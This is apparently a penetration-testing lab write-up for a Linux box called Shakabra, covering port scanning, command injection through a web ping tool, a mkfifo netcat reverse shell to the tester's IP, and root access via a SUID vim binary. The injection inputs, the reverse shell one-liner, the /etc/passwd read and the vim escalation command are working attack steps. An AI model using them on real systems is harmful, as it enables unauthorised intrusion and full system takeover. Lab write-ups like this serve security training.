---
Alias: Shakabra
Date: 5/4/22
Platform: Linux
Difficulty: Easy
Tags: #ConnectionTesterTool #Command_Injection #mkfifoNetcatReverseShell #SUIDvim.basicPrivilegeEscalation
Status: Finished
IP: 192.168.127.86
---

# {{Shakabra}}


# Resolution summary
- Found a connection tester tool running on port 80
- Added a semi colon and modified mkfifo netcat one liner; setup a netcat listener and recieved a reverse shell
- Found SUID /usr/bin/vim.basic binary on the target machine
- Found the SUID binary on GTFO bins 
- Followed the steps to escalate privileges and received a root shell

## Improved skills
- Found adding a semi colon after a command will be treated a separate command the commands will be executed sequentially 

## Used tools
- nmap
- rustscan


---

# Information Gathering
Scanned all TCP ports:
```bash
rustscan --addresses 192.168.127.86 --ulimit 5000 -- -A -sC -Pn -sV -T 1500
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
0day was here ♥

[~] The config file is expected to be at "/home/brian/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 192.168.127.86:22
Open 192.168.127.86:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -A -sC -Pn -sV -T 1500" on ip 192.168.127.86
Depending on the complexity of the script, results may take some time to appear.
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-18 18:04 PDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:04
Completed NSE at 18:04, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:04
Completed NSE at 18:04, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:04
Completed NSE at 18:04, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 18:04
Completed Parallel DNS resolution of 1 host. at 18:04, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 18:04
Scanning 192.168.127.86 [2 ports]
Discovered open port 80/tcp on 192.168.127.86
Discovered open port 22/tcp on 192.168.127.86
Completed Connect Scan at 18:04, 30.08s elapsed (2 total ports)
Initiating Service scan at 18:04
Scanning 2 services on 192.168.127.86
Completed Service scan at 18:04, 6.34s elapsed (2 services on 1 host)
NSE: Script scanning 192.168.127.86.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:04
Completed NSE at 18:05, 4.86s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:05
Completed NSE at 18:05, 0.32s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:05
Completed NSE at 18:05, 0.00s elapsed
Nmap scan report for 192.168.127.86
Host is up, received user-set (0.081s latency).
Scanned at 2022-10-18 18:04:35 PDT for 26s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 33:b9:6d:35:0b:c5:c4:5a:86:e0:26:10:95:48:77:82 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKxggEEcOcfAnY39JxZPtqfSeoP5ELSTfKdMZW1gwC5cdbN+n+rNZtzEFPJtRQrUGYntWi9OI642XAYf/w7EYnahMudH6sEkBBnycJB9mpMznx6j2woFqEC99hV2Kv+HrKBfUVH2ZottNDMTAeHmAQn38urRKTSw5XRL2lIHyjAlQuhBC9G0IOHSQevab1JO7QMS7RinkKMuK471IKEiGo6cs2qYl7s5/mbPzn74ItxZyjMaNreraKLzxxUv2rXO4D1KLJGH8hoHCdoueHenF0jA4mggOLtx33gi/Dwj65GZqz3up/93Rk3KFx9PDH81Wl/RMXzJPHObWTXFUgYCPR
|   256 a8:0f:a7:73:83:02:c1:97:8c:25:ba:fe:a5:11:5f:74 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOmK6n2750Zgk5TzwOOVaORuM6X+mZvgnDZ089sXvhfp5r09499qYQzThIXcaOuWpDmzP2e/eK27h5teQUyF+Bw=
|   256 fc:e9:9f:fe:f9:e0:4d:2d:76:ee:ca:da:af:c3:39:9e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINPPEuspoT6EYlb7TZCsDgkEBtBHIlzl8yu089UQJsA8
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:05
Completed NSE at 18:05, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:05
Completed NSE at 18:05, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:05
Completed NSE at 18:05, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.93 seconds

```

Enumerated open TCP ports:
```bash
80
22
```

Enumerated top 200 UDP ports:
```bash

```

---

# Enumeration
## Port 80 - Apache httpd 2.4.29

#### As port 80 was found to be open per nmap scan; I navigated to the boxes IP address and found the below webpage: 

![](Pasted%20image%2020221018181215.png)
#ConnectionTesterTool
#### As "127.0.0.1 was already populated in the "ping" bar I input "127.0.0.1" into it and clicked go and found the below ping results: 

![](Pasted%20image%2020221018181341.png)

#### I then typed ";cat /etc/passwd" (adding a semicolon at the end of 127.0.0.1) and found the below user "dylan" on the system: 

![](Pasted%20image%2020221018181441.png)
#Command_Injection 

#### Then typed "; which nc" and found the machine had nc installed:

![](Pasted%20image%2020221018181531.png)

![](Pasted%20image%2020221018181603.png)

---

# Exploitation
## Name of the technique
## Command injection from connection tester tool

#### I attempted to type the usual netcat one liner reverse shell syntax but didn't work. I then tried "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [kali IP] [Listener Port] >/tmp/f" found in "pentestmonkey.net" but had to modify it to the following in order to get it to work: "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.53.200 80 >/tmp/f" (the modification I added was the "-f" after command "rm") 
#mkfifoNetcatReverseShell

#### Ran the syntax above on the connection tester tool and had a listener listening on my kali machine and received a reverse shell 

![](Pasted%20image%2020221018181728.png)

---

# Privilege Escalation
## Local Enumeration

#### Typed "find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null" to find SUID binaries and found the following "vim.basic" set as SUID bit: 
![](Pasted%20image%2020221018183948.png)


## Privilege Escalation vector
## VIM SUID Binary

#### Found "vim" in GTFOBins site and followed the instructions to run the binary and type colon to enter "enter command mode" and prepend py3 to the command as the machine only has python3 and typed ":py3 import os; os.exec("/bin/sh", "sh", "-pc", "reset; exec sh -p")" and then enter and then when asked "which terminal?" Enter "xterm" and then received a root shell: 

![](Pasted%20image%2020221018184110.png)

![](Pasted%20image%2020221018184146.png)

![](Pasted%20image%2020221018184222.png)
#SUIDvim.basicPrivilegeEscalation
---

